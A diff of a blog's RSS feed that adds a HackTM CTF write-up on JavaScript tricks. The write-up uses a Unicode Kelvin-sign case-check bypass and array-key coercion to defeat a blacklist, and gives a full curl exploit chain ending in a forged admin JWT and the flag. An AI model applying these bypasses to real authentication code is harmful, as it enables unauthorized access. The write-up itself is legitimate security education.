@@ -5,8 +5,503 @@
     <description>Recent content in syang&#39;s blog on syang&#39;s blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Sat, 01 Feb 2020 17:02:55 +0800</lastBuildDate>
+    <lastBuildDate>Tue, 04 Feb 2020 15:53:37 +0800</lastBuildDate>
     <atom:link href="/" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>HackTM 的一道题背后的 JavaScript Tricks</title>
+      <link>https://syang-ng.github.io/2020/02/some-tricks-about-javascript/</link>
+      <pubDate>Tue, 04 Feb 2020 15:53:37 +0800</pubDate>
+      
+      <guid>https://syang-ng.github.io/2020/02/some-tricks-about-javascript/</guid>
+      <description>
+
+&lt;p&gt;HackTM 遇到的一道 JavaScript 相关 CTF 考题，太久没接触相关领域以至于都快忘记相关的考点了，这里再特定总结一下。&lt;/p&gt;
+
+&lt;h2 id=&#34;题目分析&#34;&gt;题目分析&lt;/h2&gt;
+
+&lt;p&gt;题目链接如下：&lt;a href=&#34;http://167.172.165.153:60000/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://167.172.165.153:60000/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到题目直接给出了相关源码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const express = require(&amp;quot;express&amp;quot;);
+const cors = require(&amp;quot;cors&amp;quot;);
+const app = express();
+const uuidv4 = require(&amp;quot;uuid/v4&amp;quot;);
+const md5 = require(&amp;quot;md5&amp;quot;);
+const jwt = require(&amp;quot;express-jwt&amp;quot;);
+const jsonwebtoken = require(&amp;quot;jsonwebtoken&amp;quot;);
+const server = require(&amp;quot;http&amp;quot;).createServer(app);
+const io = require(&amp;quot;socket.io&amp;quot;)(server);
+const bigInt = require(&amp;quot;big-integer&amp;quot;);
+const { flag, p, n, _clearPIN, jwtSecret } = require(&amp;quot;./flag&amp;quot;);
+
+const config = {
+  port: process.env.PORT || 8081,
+  width: 120,
+  height: 80,
+  usersOnline: 0,
+  message: &amp;quot;Hello there!&amp;quot;,
+  p: p,
+  n: n,
+  adminUsername: &amp;quot;hacktm&amp;quot;,
+  whitelist: [&amp;quot;/&amp;quot;, &amp;quot;/login&amp;quot;, &amp;quot;/init&amp;quot;],
+  backgroundColor: 0x888888,
+  version: Number.MIN_VALUE
+};
+
+io.sockets.on(&amp;quot;connection&amp;quot;, function(socket) {
+  config.usersOnline++;
+  socket.on(&amp;quot;disconnect&amp;quot;, function() {
+    config.usersOnline--;
+  });
+});
+
+let users = {
+  0: {
+    username: config.adminUsername,
+    rights: Object.keys(config)
+  }
+};
+
+let board = new Array(config.height)
+  .fill(0)
+  .map(() =&amp;gt; new Array(config.width).fill(config.backgroundColor));
+let boardString = boardToStrings();
+
+app.use(express.json());
+app.use(cors());
+app.use(
+  jwt({ secret: jwtSecret }).unless({
+    path: config.whitelist
+  })
+);
+app.use(function(error, req, res, next) {
+  if (error.name === &amp;quot;UnauthorizedError&amp;quot;) {
+    res.json(err(&amp;quot;Invalid token or not logged in.&amp;quot;));
+  }
+});
+
+function sign(o) {
+  return jsonwebtoken.sign(o, jwtSecret);
+}
+
+function isAdmin(u) {
+  return u.username.toLowerCase() == config.adminUsername.toLowerCase();
+}
+
+function ok(data = {}) {
+  return { status: &amp;quot;ok&amp;quot;, data: data };
+}
+
+function err(msg = &amp;quot;Something went wrong.&amp;quot;) {
+  return { status: &amp;quot;error&amp;quot;, message: msg };
+}
+
+function onlyUnique(value, index, self) {
+  return self.indexOf(value) === index;
+}
+
+app.get(&amp;quot;/&amp;quot;, (req, res) =&amp;gt; {
+  // Get current board
+  res.json(ok({ board: boardString }));
+});
+
+app.post(&amp;quot;/init&amp;quot;, (req, res) =&amp;gt; {
+  // Initialize new round and sign admin token
+  // RSA protected!
+  // POST
+  // {
+  //   p:&amp;quot;0&amp;quot;,
+  //   q:&amp;quot;0&amp;quot;
+  // }
+
+  let { p = &amp;quot;0&amp;quot;, q = &amp;quot;0&amp;quot;, clearPIN } = req.body;
+
+  let target = md5(config.n.toString());
+
+  let pwHash = md5(
+    bigInt(String(p))
+      .multiply(String(q))
+      .toString()
+  );
+
+  if (pwHash == target &amp;amp;&amp;amp; clearPIN === _clearPIN) {
+    // Clear the board
+    board = new Array(config.height)
+      .fill(0)
+      .map(() =&amp;gt; new Array(config.width).fill(config.backgroundColor));
+    boardString = boardToStrings();
+
+    io.emit(&amp;quot;board&amp;quot;, { board: boardString });
+  }
+
+  //Sign the admin ID
+  let adminId = pwHash
+    .split(&amp;quot;&amp;quot;)
+    .map((c, i) =&amp;gt; c.charCodeAt(0) ^ target.charCodeAt(i))
+    .reduce((a, b) =&amp;gt; a + b);
+
+  console.log(adminId);
+
+  res.json(ok({ token: sign({ id: adminId }) }));
+});
+
+app.get(&amp;quot;/flag&amp;quot;, (req, res) =&amp;gt; {
+  // Get the flag
+  // Only for root
+  if (req.user.id == 0) {
+    res.send(ok({ flag: flag }));
+  } else {
+    res.send(err(&amp;quot;Unauthorized&amp;quot;));
+  }
+});
+
+app.get(&amp;quot;/serverInfo&amp;quot;, (req, res) =&amp;gt; {
+  // Get server info
+  // Only for logged in users
+
+  let user = users[req.user.id] || { rights: [] };
+  let info = user.rights.map(i =&amp;gt; ({ name: i, value: config[i] }));
+  res.json(ok({ info: info }));
+});
+
+app.post(&amp;quot;/paint&amp;quot;, (req, res) =&amp;gt; {
+  // Paint on the canvas
+  // Only for logged in users
+  // POST
+  // {
+  //   x:0,
+  //   y:0
+  // }
+  let user = users[req.user.id] || {};
+
+  x = req.body.x;
+  y = req.body.y;
+
+  let color = user.color || 0x0;
+
+  if (board[y] &amp;amp;&amp;amp; board[y][x] &amp;gt;= 0) {
+    board[y][x] = color;
+    boardString = boardToStrings();
+    io.emit(&amp;quot;change&amp;quot;, { change: { pos: [x, y], color: color } });
+    res.send(ok());
+  } else {
+    res.send(err(&amp;quot;Invalid painting&amp;quot;));
+  }
+});
+
+app.post(&amp;quot;/updateUser&amp;quot;, (req, res) =&amp;gt; {
+  // Update user color and rights
+  // Only for admin
+  // POST
+  // {
+  //   color: 0xDEDBEE,
+  //   rights: [&amp;quot;height&amp;quot;, &amp;quot;width&amp;quot;, &amp;quot;usersOnline&amp;quot;]
+  // }
+  let uid = req.user.id;
+  let user = users[uid];
+  if (!user || !isAdmin(user)) {
+    res.json(err(&amp;quot;You&#39;re not an admin!&amp;quot;));
+    return;
+  }
+  let color = parseInt(req.body.color);
+  users[uid].color = (color || 0x0) &amp;amp; 0xffffff;
+  let rights = req.body.rights || [];
+  if (rights.length &amp;gt; 0 &amp;amp;&amp;amp; checkRights(rights)) {
+    users[uid].rights = user.rights.concat(rights).filter(onlyUnique);
+  }
+
+  res.json(ok({ user: users[uid] }));
+});
+
+app.post(&amp;quot;/login&amp;quot;, (req, res) =&amp;gt; {
+  // Login
+  // POST
+  // {
+  //   username: &amp;quot;dumbo&amp;quot;,
+  // }
+
+  let u = {
+    username: req.body.username,
+    id: uuidv4(),
+    color: Math.random() &amp;lt; 0.5 ? 0xffffff : 0x0,
+    rights: [
+      &amp;quot;message&amp;quot;,
+      &amp;quot;height&amp;quot;,
+      &amp;quot;width&amp;quot;,
+      &amp;quot;version&amp;quot;,
+      &amp;quot;usersOnline&amp;quot;,
+      &amp;quot;adminUsername&amp;quot;,
+      &amp;quot;backgroundColor&amp;quot;
+    ]
+  };
+
+  if (isValidUser(u)) {
+    users[u.id] = u;
+    res.send(ok({ token: sign({ id: u.id }) }));
+  } else {
+    res.json(err(&amp;quot;Invalid creds&amp;quot;));
+  }
+});
+
+function isValidUser(u) {
+  return (
+    u.username.length &amp;gt;= 3 &amp;amp;&amp;amp;
+    u.username.toUpperCase() !== config.adminUsername.toUpperCase()
+  );
+}
+
+function boardToStrings() {
+  return board.map(b =&amp;gt; b.join(&amp;quot;,&amp;quot;));
+}
+
+function checkRights(arr) {
+  let blacklist = [&amp;quot;p&amp;quot;, &amp;quot;n&amp;quot;, &amp;quot;port&amp;quot;];
+  
+  for (let i = 0; i &amp;lt; arr.length; i++) {
+    const element = arr[i];
+    if (blacklist.includes(element)) {
+      return false;
+    }
+  }
+  return true;
+}
+
+server.listen(config.port, () =&amp;gt;
+  console.log(`Server listening on port ${config.port}!`)
+);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;首先是源码审计，很容易就能看到路由：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;app.get(&amp;quot;/flag&amp;quot;, (req, res) =&amp;gt; {
+  // Get the flag
+  // Only for root
+  if (req.user.id == 0) {
+    res.send(ok({ flag: flag }));
+  } else {
+    res.send(err(&amp;quot;Unauthorized&amp;quot;));
+  }
+});
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;该路由要求用户 id 等于 0，结合到程序使用了 jwt，在无法伪造 jwt 的情况下，需要考虑如何获得 id 为 0 的用户的 jwt，此时观察到以下路由：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;app.post(&amp;quot;/init&amp;quot;, (req, res) =&amp;gt; {
+  // Initialize new round and sign admin token
+  // RSA protected!
+  // POST
+  // {
+  //   p:&amp;quot;0&amp;quot;,
+  //   q:&amp;quot;0&amp;quot;
+  // }
+
+  let { p = &amp;quot;0&amp;quot;, q = &amp;quot;0&amp;quot;, clearPIN } = req.body;
+
+  let target = md5(config.n.toString());
+
+  let pwHash = md5(
+    bigInt(String(p))
+      .multiply(String(q))
+      .toString()
+  );
+
+  if (pwHash == target &amp;amp;&amp;amp; clearPIN === _clearPIN) {
+    // Clear the board
+    board = new Array(config.height)
+      .fill(0)
+      .map(() =&amp;gt; new Array(config.width).fill(config.backgroundColor));
+    boardString = boardToStrings();
+
+    io.emit(&amp;quot;board&amp;quot;, { board: boardString });
+  }
+
+  //Sign the admin ID
+  let adminId = pwHash
+    .split(&amp;quot;&amp;quot;)
+    .map((c, i) =&amp;gt; c.charCodeAt(0) ^ target.charCodeAt(i))
+    .reduce((a, b) =&amp;gt; a + b);
+
+  console.log(adminId);
+
+  res.json(ok({ token: sign({ id: adminId }) }));
+});
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;很明显在 &lt;code&gt;n = p * q&lt;/code&gt; 时，有 &lt;code&gt;adminId&lt;/code&gt;  等于 0，此时能获得 id 为 0 的 token，因此下一步就是如何泄露程序的 p 和 n，这里观察到以下路由：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;app.get(&amp;quot;/serverInfo&amp;quot;, (req, res) =&amp;gt; {
+  // Get server info
+  // Only for logged in users
+
+  let user = users[req.user.id] || { rights: [] };
+  let info = user.rights.map(i =&amp;gt; ({ name: i, value: config[i] }));
+  res.json(ok({ info: info }));
+});
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;会将 &lt;code&gt;user.rights&lt;/code&gt; 内的值作为 key 得到 config[key] 的值，而 p / n 恰好在 config 对象内，所以下一步就是如何给 &lt;code&gt;user.rights&lt;/code&gt; 增加 p 和 n 这两个值，继续看下一个路由：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;app.post(&amp;quot;/updateUser&amp;quot;, (req, res) =&amp;gt; {
+  // Update user color and rights
+  // Only for admin
+  // POST
+  // {
+  //   color: 0xDEDBEE,
+  //   rights: [&amp;quot;height&amp;quot;, &amp;quot;width&amp;quot;, &amp;quot;usersOnline&amp;quot;]
+  // }
+  let uid = req.user.id;
+  let user = users[uid];
+  if (!user || !isAdmin(user)) {
+    res.json(err(&amp;quot;You&#39;re not an admin!&amp;quot;));
+    return;
+  }
+  let color = parseInt(req.body.color);
+  users[uid].color = (color || 0x0) &amp;amp; 0xffffff;
+  let rights = req.body.rights || [];
+  if (rights.length &amp;gt; 0 &amp;amp;&amp;amp; checkRights(rights)) {
+    users[uid].rights = user.rights.concat(rights).filter(onlyUnique);
+  }
+
+  res.json(ok({ user: users[uid] }));
+});
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;很明显，只要满足 &lt;code&gt;!isAdmin(user)&lt;/code&gt; 和 &lt;code&gt;checkRights(rights)&lt;/code&gt; 两个函数即可。看两个函数的实现：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function isAdmin(u) {
+  return u.username.toLowerCase() == config.adminUsername.toLowerCase();
+}
+
+function checkRights(arr) {
+  let blacklist = [&amp;quot;p&amp;quot;, &amp;quot;n&amp;quot;, &amp;quot;port&amp;quot;];
+  
+  for (let i = 0; i &amp;lt; arr.length; i++) {
+    const element = arr[i];
+    if (blacklist.includes(element)) {
+      return false;
+    }
+  }
+  return true;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;结合注册用户时的检验函数：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function isValidUser(u) {
+  return (
+    u.username.length &amp;gt;= 3 &amp;amp;&amp;amp;
+    u.username.toUpperCase() !== config.adminUsername.toUpperCase()
+  );
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;很明显本题的考点非常清楚：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;找到一个字符串 s 使其满足 &lt;code&gt;s.toUpperCase() !== config.adminUsername.toUpperCase()&lt;/code&gt; 且 &lt;code&gt;s.toLowerCase() == config.adminUsername.toLowerCase()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;找到属性 key 使其满足 &lt;code&gt;[&amp;quot;p&amp;quot;, &amp;quot;n&amp;quot;, &amp;quot;port&amp;quot;].includes(key) === false&lt;/code&gt; 而且 &lt;code&gt;config[key] === p&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;下面直接贴 exp：&lt;/p&gt;
+
+&lt;h3 id=&#34;exp&#34;&gt;exp&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# /login
+curl --location --request POST &#39;http://167.172.165.153:60001/login&#39; \
+--header &#39;Content-Type: application/json&#39; \
+--data-raw &#39;{
+	&amp;quot;username&amp;quot;: &amp;quot;hacKtm&amp;quot;
+}&#39;
+# {&amp;quot;status&amp;quot;:&amp;quot;ok&amp;quot;,&amp;quot;data&amp;quot;:{&amp;quot;token&amp;quot;:&amp;quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImVmNDdlZTM2LTZjZTMtNGNmMS04OThiLWIwMGEwMGY2NTQ3NiIsImlhdCI6MTU4MDYxNzY3OH0.yzF9x5J7tbnjUWt-rXRd-WOKHXYTC1u9RFgcdv6DSEs&amp;quot;}}
+
+# /updateUser
+curl --location --request POST &#39;http://167.172.165.153:60001/updateUser&#39; \
+--header &#39;Content-Type: application/json&#39; \
+--header &#39;Authorization:  Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImVmNDdlZTM2LTZjZTMtNGNmMS04OThiLWIwMGEwMGY2NTQ3NiIsImlhdCI6MTU4MDYxNzY3OH0.yzF9x5J7tbnjUWt-rXRd-WOKHXYTC1u9RFgcdv6DSEs&#39; \
+--data-raw &#39;{
+	&amp;quot;color&amp;quot;: 123,
+	&amp;quot;rights&amp;quot;: [[&amp;quot;n&amp;quot;],[&amp;quot;p&amp;quot;]]
+}&#39;
+# {&amp;quot;status&amp;quot;:&amp;quot;ok&amp;quot;,&amp;quot;data&amp;quot;:{&amp;quot;user&amp;quot;:{&amp;quot;username&amp;quot;:&amp;quot;hacKtm&amp;quot;,&amp;quot;id&amp;quot;:&amp;quot;ef47ee36-6ce3-4cf1-898b-b00a00f65476&amp;quot;,&amp;quot;color&amp;quot;:0,&amp;quot;rights&amp;quot;:[&amp;quot;message&amp;quot;,&amp;quot;height&amp;quot;,&amp;quot;width&amp;quot;,&amp;quot;version&amp;quot;,&amp;quot;usersOnline&amp;quot;,&amp;quot;adminUsername&amp;quot;,&amp;quot;backgroundColor&amp;quot;,[&amp;quot;n&amp;quot;],[&amp;quot;p&amp;quot;]]}}}
+
+# /serverInfo
+curl --location --request GET &#39;http://167.172.165.153:60001/serverInfo&#39; \
+--header &#39;Content-Type: application/json&#39; \
+--header &#39;Authorization:  Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImVmNDdlZTM2LTZjZTMtNGNmMS04OThiLWIwMGEwMGY2NTQ3NiIsImlhdCI6MTU4MDYxNzY3OH0.yzF9x5J7tbnjUWt-rXRd-WOKHXYTC1u9RFgcdv6DSEs&#39; 
+# &amp;quot;status&amp;quot;:&amp;quot;ok&amp;quot;,&amp;quot;data&amp;quot;:{&amp;quot;info&amp;quot;:[{&amp;quot;name&amp;quot;:&amp;quot;message&amp;quot;,&amp;quot;value&amp;quot;:&amp;quot;Hello there!&amp;quot;},{&amp;quot;name&amp;quot;:&amp;quot;height&amp;quot;,&amp;quot;value&amp;quot;:80},{&amp;quot;name&amp;quot;:&amp;quot;width&amp;quot;,&amp;quot;value&amp;quot;:120},{&amp;quot;name&amp;quot;:&amp;quot;version&amp;quot;,&amp;quot;value&amp;quot;:5e-324},{&amp;quot;name&amp;quot;:&amp;quot;usersOnline&amp;quot;,&amp;quot;value&amp;quot;:17},{&amp;quot;name&amp;quot;:&amp;quot;adminUsername&amp;quot;,&amp;quot;value&amp;quot;:&amp;quot;hacktm&amp;quot;},{&amp;quot;name&amp;quot;:&amp;quot;backgroundColor&amp;quot;,&amp;quot;value&amp;quot;:8947848},{&amp;quot;name&amp;quot;:[&amp;quot;n&amp;quot;],&amp;quot;value&amp;quot;:&amp;quot;54522055008424167489770171911371662849682639259766156337663049265694900400480408321973025639953930098928289957927653145186005490909474465708278368644555755759954980218598855330685396871675591372993059160202535839483866574203166175550802240701281743391938776325400114851893042788271007233783815911979&amp;quot;},{&amp;quot;name&amp;quot;:[&amp;quot;p&amp;quot;],&amp;quot;value&amp;quot;:&amp;quot;192342359675101460380863753759239746546129652637682939698853222883672421041617811211231308956107636139250667823711822950770991958880961536380231512617&amp;quot;}]}}
+
+# /init
+curl --location --request POST &#39;http://167.172.165.153:60001/init&#39; \
+--header &#39;Content-Type: application/json&#39; \
+--header &#39;Authorization:  Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImVmNDdlZTM2LTZjZTMtNGNmMS04OThiLWIwMGEwMGY2NTQ3NiIsImlhdCI6MTU4MDYxNzY3OH0.yzF9x5J7tbnjUWt-rXRd-WOKHXYTC1u9RFgcdv6DSEs&#39; \
+--data-raw &#39;{
+	&amp;quot;p&amp;quot;: &amp;quot;192342359675101460380863753759239746546129652637682939698853222883672421041617811211231308956107636139250667823711822950770991958880961536380231512617&amp;quot;,
+	&amp;quot;q&amp;quot;: &amp;quot;283463585975138667365296941492014484422030788964145259030277643596460860183630041214426435642097873422136064628904111949258895415157497887086501927987&amp;quot;,
+	&amp;quot;clearPIN&amp;quot;: &amp;quot;2333&amp;quot;
+}&#39;
+# {&amp;quot;status&amp;quot;:&amp;quot;ok&amp;quot;,&amp;quot;data&amp;quot;:{&amp;quot;token&amp;quot;:&amp;quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiaWF0IjoxNTgwNjE4ODgyfQ.rBRCrfHfhhv_hfgN9ZZedzRMOQQ8wj0zBXiqobX-B7Q&amp;quot;}}
+
+# /flag
+curl --location --request GET &#39;http://167.172.165.153:60001/flag&#39; \
+--header &#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiaWF0IjoxNTgwNjE4ODgyfQ.rBRCrfHfhhv_hfgN9ZZedzRMOQQ8wj0zBXiqobX-B7Q&#39;
+# {&amp;quot;status&amp;quot;:&amp;quot;ok&amp;quot;,&amp;quot;data&amp;quot;:{&amp;quot;flag&amp;quot;:&amp;quot;HackTM{Draw_m3_like_0ne_of_y0ur_japan3se_girls}&amp;quot;}}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;javascript-tricks&#34;&gt;JavaScript Tricks&lt;/h2&gt;
+
+&lt;h3 id=&#34;unicode&#34;&gt;Unicode&lt;/h3&gt;
+
+&lt;p&gt;看以下这段代码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;for(let i = 0; i &amp;lt; 0xffff; i++) {
+    let c = String.fromCharCode(i)
+    if(c.toLowerCase() == &#39;k&#39; &amp;amp;&amp;amp; c.toUpperCase()!= &#39;K&#39;) {
+        console.log(i)
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;正常情况下应该没有任何结果，但在 js 里，会得到一个很有意思的值 8490，对应的字符是 &lt;code&gt;K&lt;/code&gt;，该字符并非大写字母 &lt;code&gt;K&lt;/code&gt; ，而是拉丁字母，但对应的小写得到的是 &lt;code&gt;k&lt;/code&gt;，这也算一个比较有意思的 JavaScript Trick，剩下的还有许多字母也有这种特性，这里就不再多讲了。&lt;/p&gt;
+
+&lt;h3 id=&#34;tostring&#34;&gt;toString&lt;/h3&gt;
+
+&lt;p&gt;观察以下代码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ node
+Welcome to Node.js v12.4.0.
+Type &amp;quot;.help&amp;quot; for more information.
+&amp;gt; const array = [&#39;n&#39;]
+undefined
+&amp;gt; console.log(array)
+[ &#39;n&#39; ]
+undefined
+&amp;gt; array
+[ &#39;n&#39; ]
+&amp;gt; array + &#39;c&#39;
+&#39;nc&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这主要是因为 JavaScript 对 Array 对象的 &lt;code&gt;toString&lt;/code&gt; 函数的默认实现是等价于 &lt;code&gt;array.join(&#39;,&#39;)&lt;/code&gt;，返回由 &lt;code&gt;,&lt;/code&gt; 拼接而成的字符串，而在访问 JavaScript 对象时，如果以数组作为键名，实际是以数组 &lt;code&gt;toString()&lt;/code&gt; 函数的返回值作为键名，因此继续看以下代码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;&amp;gt; let a = [&#39;a&#39;]
+undefined
+&amp;gt; let aa = [&#39;a&#39;]
+undefined
+&amp;gt; aa === a
+false
+&amp;gt; let b = {}
+undefined
+&amp;gt; b[a] = &#39;c&#39;
+&#39;c&#39;
+&amp;gt; b[a] === b[aa]
+true
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;不难理解，由于两个数组是不同的对象，因此 &lt;code&gt;a === aa&lt;/code&gt; 返回的是 &lt;code&gt;false&lt;/code&gt;；而二者 &lt;code&gt;toString()&lt;/code&gt; 函数的返回值相同，因此在对象中二者实际是同一个键，&lt;code&gt;b[a] === b[aa]&lt;/code&gt; 返回的是 &lt;code&gt;true&lt;/code&gt;。&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>CVE 2019 11076 Cribl UI 1.5.0 未授权命令执行漏洞分析</title>
@@ -393,7 +888,7 @@ console.log(decoded);
 
 &lt;p&gt;FART 是看雪大牛 hanbingle 提出的一种基于主动调用开发的脱壳工具，工具的具体原理可以阅读帖子 &lt;a href=&#34;https://bbs.pediy.com/thread-252630.htm&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;FART：ART环境下基于主动调用的自动化脱壳方案&lt;/a&gt;，本文是结合该篇帖子和源码的学习笔记。&lt;/p&gt;
 
-&lt;p&gt;源码地址：&lt;a href=&#34;https://github.com/hanbinglengyue/FART，该代码是基于&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/hanbinglengyue/FART，该代码是基于&lt;/a&gt; Android 6.0 源码基础上修改而成的，加入了主动调用并修复函数的模块。&lt;/p&gt;
+&lt;p&gt;源码地址：&lt;a href=&#34;https://github.com/hanbinglengyue/FART&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/hanbinglengyue/FART&lt;/a&gt;，该代码是基于 Android 6.0 源码基础上修改而成的，加入了主动调用并修复函数的模块。&lt;/p&gt;
 
 &lt;h2 id=&#34;代码结构&#34;&gt;代码结构&lt;/h2&gt;
 
@@ -4478,202 +4973,6 @@ print(rc4decrypt(base64decode()))
 &lt;li&gt;&lt;a href=&#34;https://bbs.pediy.com/thread-250413.htm&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;看雪论坛 - 第二题 变形金刚&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;http://ronpa.top/2018/11/27/%E7%BB%8F%E5%85%B8%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86RC4%E5%88%86%E6%9E%90/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;经典对称加密RC4分析&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Android 某应用的简单逆向</title>
-      <link>https://syang-ng.github.io/2019/03/reverse-an-android-app/</link>
-      <pubDate>Fri, 22 Mar 2019 13:30:50 +0000</pubDate>
-      
-      <guid>https://syang-ng.github.io/2019/03/reverse-an-android-app/</guid>
-      <description>
-
-&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
-
-&lt;p&gt;项目需求，需要对 Android 逆向有一定了解。本周对某加壳应用进行了简单逆向，现在在博客上记录一下逆向过程。&lt;/p&gt;
-
-&lt;h2 id=&#34;java&#34;&gt;Java&lt;/h2&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-An-Android-App/manifest.png&#34; alt=&#34;Manifest&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;可以看到该应用使用了自定义的 Application 和 Activity 作为程序入口，继续跟到这两个类看相应源码：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-An-Android-App/App.png&#34; alt=&#34;App&#34; /&gt;
-&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-An-Android-App/MAct.png&#34; alt=&#34;MAct&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;可以看到 &lt;code&gt;initSASDK()&lt;/code&gt; 函数明显存在一定的问题，推测为加壳应用的壳入口，继续跟进相应代码：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-An-Android-App/start.png&#34; alt=&#34;start&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;可以看到最终调用的 start 函数里有如下的执行流程:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;xzbs_ibq = WXMDGnzykrccwjZDVUmhfzZvEzBIzZfWBNKUhgaIOWSrSobBjR;
-srq(yiqomGNhdxLIJidVfyApfmJTIHPyutBbUkJxcWjBQHBrvbIXsOy, AvHtcXKhnamHsyrioJsYtObXYmrNsqUJmGFVnRXJTojtxBcOqgIj, FrzFWtDbeEGzjMXTZsUhYhYauwqXwJmljQFVrazhYTpbTiUljnepX, UyWqeczsunPuNjiSzoJlbLiNwGcpywsOaFqtWYqnJLjSYuVPEaozta, peVYfmJPInUHjHaTbqicJtUHmRZtZdUBcwvWjFSbbWlllsIdzEOXioi, LrAaxenJlqbZtbwLTeVausucgeMQpsscBeYNQPGYxiwYFHTARqqJgYDR);
-if (ezgyq()) {
-    xtmltaqolx(2, 3, 3, 3);
-    aozftlu();
-    lfob();
-    tevwztzyjqace();
-}
-umnyoz(324, 6, false, 6);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;很明显，&lt;code&gt;ezqyg()&lt;/code&gt; 函数试检测是否初始化完成的标志，阅读该函数代码：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;private static boolean ezgyq() {
-    String qyhhdfdclv = &amp;quot;aebchjtntz&amp;quot; + &amp;quot;xohpdsfuqm&amp;quot;;
-    String osrz = &amp;quot;zjydzywrik&amp;quot; + &amp;quot;yoxnmlxcskkcqfswphgt&amp;quot;;
-    int uzcjyygfg = (1471 + 1) * 2;
-    return (new File(ozxzzjhyypbi()).exists() &amp;amp;&amp;amp; new File(ozxzzjhyypbi()).length() == new File(dyozzxjqf()).length() / 2) ? false : true;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;很明显除了最后一行外都是插入的 junk code，而最后一行的比较非常明显，是比较某一个文件的大小是否是另一个文件的两倍。继续阅读 &lt;code&gt;ozxzzjhyypbi()&lt;/code&gt; 和 &lt;code&gt;dyozzxjqf()&lt;/code&gt; 函数的源码，我们知道这两个文件其实是 &lt;code&gt;/data/user/0/aaa.bbb.ccc/files/libswbqgonYxEgdlSXzbootstrap.so&lt;/code&gt; 和 &lt;code&gt;/data/app/aaa.bbb.ccc-1/lib/arm/libswbqgonYxEgdlSXzbootstrap.so&lt;/code&gt;，很明显，在初始化的过程中，程序会将 &lt;code&gt;libswbqgonYxEgdlSXzbootstrap.so&lt;/code&gt; 写入自身的 files 文件夹中，而且很有可能在写入过程中执行了某个解密函数，使得保存在本机的 so 文件只有之前的一半大小。&lt;/p&gt;
-
-&lt;p&gt;下面再看初始化函数会执行什么操作，首先是 &lt;code&gt;xtmltaqolx&lt;/code&gt; 函数会将 assets 文件下的几个文件拷贝到 files 文件夹下，代码优化如下：&lt;/p&gt;
-
